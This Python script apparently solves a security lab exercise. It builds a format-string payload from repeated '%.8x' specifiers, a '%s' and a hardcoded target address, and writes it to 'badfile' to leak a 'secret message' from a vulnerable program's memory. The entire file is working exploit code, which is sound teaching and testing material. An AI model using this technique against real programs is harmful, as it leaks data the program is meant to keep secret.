#!/usr/bin/python3
import sys

# Address of the secret message
secret_msg_addr = 0x080af014

# Initialize payload with 1500 bytes
content = bytearray(0x0 for _ in range(1500))

# Construct the format string with offset 11
s = "%.8x " * 10 + "%s\n"  # 10 entries + %s at 11th position
fmt = s.encode('latin-1')

# Store the format string in the payload
content[0:len(fmt)] = fmt

# Place the secret message address at the end of the format string
addr_offset = len(fmt)
content[addr_offset:addr_offset+4] = (secret_msg_addr).to_bytes(4, byteorder='little')

# Write payload to badfile
with open('badfile', 'wb') as f:
    f.write(content)

# Output payload for testing
sys.stdout.buffer.write(content)
